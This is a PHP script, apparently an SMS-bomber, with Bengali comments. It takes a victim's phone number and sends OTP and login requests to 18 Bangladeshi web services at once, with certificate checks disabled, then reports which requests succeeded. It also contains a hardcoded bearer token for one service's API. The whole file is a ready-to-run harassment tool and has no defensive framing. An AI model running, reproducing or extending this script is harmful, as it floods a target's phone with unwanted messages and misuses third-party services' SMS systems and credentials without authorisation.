<?php
header('Content-Type: application/json');
set_time_limit(0);

$phone = $_GET['phone'] ?? '';
if(empty($phone)) die(json_encode(["error" => "Phone number needed"]));

$p11 = preg_replace('/^\+?88/', '', $phone);
if(substr($p11, 0, 1) !== "0") $p11 = "0" . $p11;
$p_plus88 = "+88" . $p11;

$apis = [];

// --- ২ টি নতুন সার্ভিস ---
$apis[] = ["n"=>"shomvob","u"=>"https://backend-api.shomvob.co/api/v2/otp/phone","m"=>"POST","d"=>["phone"=>"88".$p11,"is_retry"=>0],"h"=>["Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY1OTg5NTcwOH0.IOdKen62ye0N9WljM_cj3Xffmjs3dXUqoJRZ_1ezd4Q"]];
$apis[] = ["n"=>"chorki","u"=>"https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en","m"=>"POST","d"=>["number"=>$p_plus88],"h"=>["Origin:https://www.chorki.com"]];

// --- ১৬টি আগের সচল সার্ভিস ---
$apis[] = ["n"=>"ali2bd","u"=>"https://edge.ali2bd.com/api/consumer/v1/auth/login","m"=>"POST","d"=>["username"=>$p11]];
$apis[] = ["n"=>"bdtickets","u"=>"https://api.bdtickets.com:20100/v1/auth","m"=>"POST","d"=>["phoneNumber"=>$p_plus88]];
$apis[] = ["n"=>"pbs","u"=>"https://apialpha.pbs.com.bd/api/OTP/generateOTP","m"=>"POST","d"=>["userPhone"=>$p11]];
$apis[] = ["n"=>"hishabee","u"=>"https://app.hishabee.business/api/V2/otp/send?mobile_number=$p11&country_code=88","m"=>"POST"];
$apis[] = ["n"=>"osudpotro","u"=>"https://api.osudpotro.com/api/v1/users/send_otp","m"=>"POST","d"=>["mobile"=>"+88-".$p11]];
$apis[] = ["n"=>"apex4u","u"=>"https://api.apex4u.com/api/auth/login","m"=>"POST","d"=>["phoneNumber"=>$p11]];
$apis[] = ["n"=>"shadhin","u"=>"https://connect.shadhinmusic.com/v1/api//otp/send","m"=>"POST","d"=>["msisdn"=>"88".$p11]];
$apis[] = ["n"=>"redx","u"=>"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp","m"=>"POST","d"=>["phoneNumber"=>$p11]];
$apis[] = ["n"=>"bikroy","u"=>"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$p11","m"=>"GET"];
$apis[] = ["n"=>"shwapno","u"=>"https://www.shwapno.com/api/auth","m"=>"POST","d"=>["phoneNumber"=>$p_plus88]];
$apis[] = ["n"=>"garibook","u"=>"https://api.garibookadmin.com/api/v4/user/login","m"=>"POST","d"=>["mobile"=>$p_plus88]];
$apis[] = ["n"=>"shikho","u"=>"https://api.shikho.com/auth/v2/send/sms","m"=>"POST","d"=>["phone"=>"88".$p11]];
$apis[] = ["n"=>"deeptoplay","u"=>"https://api.deeptoplay.com/v2/auth/login","m"=>"POST","d"=>["number"=>"+880".substr($p11,-10)]];
$apis[] = ["n"=>"fundesh","u"=>"https://fundesh.com.bd/api/auth/generateOTP","m"=>"POST","d"=>["msisdn"=>substr($p11,1)]];
$apis[] = ["n"=>"iqra","u"=>"https://apibeta.iqra-live.com/api/v2/sent-otp/".$p11,"m"=>"GET"];
$apis[] = ["n"=>"swap","u"=>"https://api.swap.com.bd/api/v1/send-otp/v2","m"=>"POST","d"=>["phone"=>"+880".substr($p11,-10)]];



// মাল্টি-কার্ল ইঞ্জিন
$mh = curl_multi_init(); $handles = [];
foreach($apis as $k => $a){
    $ch = curl_init($a['u']);
    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>1, CURLOPT_TIMEOUT=>15, CURLOPT_SSL_VERIFYPEER=>0]);
    if(isset($a['h'])) curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($a['h'], ["Content-Type: application/json"]));
    if($a['m']=="POST"){
        curl_setopt($ch, CURLOPT_POST, 1);
        if(isset($a['d'])) curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($a['d']));
    }
    $handles[$k] = $ch;
    curl_multi_add_handle($mh, $ch);
}
$active = null; do{curl_multi_exec($mh, $active);}while($active);
$res = []; foreach($handles as $k => $c){$res[$apis[$k]['n']] = curl_getinfo($c, CURLINFO_HTTP_CODE); curl_multi_remove_handle($mh, $c); curl_close($c);}
curl_multi_close($mh);
echo json_encode(["status"=>"success", "results"=>$res], JSON_PRETTY_PRINT);
